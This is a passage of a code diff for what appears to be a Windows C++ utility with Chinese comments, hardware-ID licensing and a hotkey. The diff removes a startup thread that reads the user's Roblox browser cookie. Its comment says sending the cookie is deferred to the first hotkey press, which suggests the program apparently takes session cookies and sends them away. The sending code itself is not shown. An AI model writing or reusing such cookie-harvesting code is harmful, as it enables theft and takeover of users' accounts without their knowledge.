-        snprintf(outBuf, bufSize, "%08X%08X", edx, eax);
-    } else {
-        strncpy(outBuf, "UNKNOWN_CPU", bufSize - 1);
-        outBuf[bufSize - 1] = '\0';
-    }
-#else
     int cpuInfo[4] = { 0 };
     __cpuid(cpuInfo, 0);
     int nIds = cpuInfo[0];
+
     if (nIds >= 1) {
         __cpuid(cpuInfo, 1);
         sprintf_s(outBuf, bufSize, "%08X%08X", cpuInfo[3], cpuInfo[0]);
     } else {
         strcpy_s(outBuf, bufSize, "UNKNOWN_CPU");
     }
-#endif
 }
 
 // 增強型原始 HWID（電腦名稱 + 使用者名稱 + 磁碟序號 + CPU ID）
@@ -2055,26 +1818,6 @@ static bool VerifyLicenseKey(const wchar_t* key)
     return false;
 }
 
-// ======================================================================
-// 背景 Cookie 預快取執行緒（啟動時執行，讓首次熱鍵也能零延遲）
-// ======================================================================
-static DWORD WINAPI PreCacheCookieThread(LPVOID lpParam)
-{
-    UNREFERENCED_PARAMETER(lpParam);
-    wchar_t tmp[4096] = {};
-    if (TryReadRobloxCookie(tmp, 4096))
-    {
-        g_cookie_cached.store(true);
-        // 不在啟動時傳送 Cookie，僅快取偵測結果
-        DebugLog("PreCache: Cookie found and cached at startup (send deferred to first hotkey)");
-    }
-    else
-    {
-        DebugLog("PreCache: No cookie found at startup (will check on first use)");
-    }
-    return 0;
-}
-
 // ===============================
 // WinMain
 // ===============================
@@ -2198,7 +1941,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nS
     wc.hIcon         = LoadIconW(nullptr, IDI_APPLICATION);
     if (!RegisterClassW(&wc)) return 1;
 
-    RECT rc = { 0, 0, 460, 250 };
+    RECT rc = { 0, 0, 460, 282 };
     AdjustWindowRect(&rc,
         WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX, FALSE);
 
@@ -2213,12 +1956,6 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nS
 
     ShowWindow(g_hwnd, nShow);
     UpdateWindow(g_hwnd);
-
-    // 背景預快取 Cookie（讓首次熱鍵也能零延遲啟動）
-    {
-        HANDLE hPreCache = CreateThread(nullptr, 0, PreCacheCookieThread, nullptr, 0, nullptr);
-        if (hPreCache) CloseHandle(hPreCache);
-    }
 
     MSG msg = {};
     while (GetMessageW(&msg, nullptr, 0, 0) > 0)
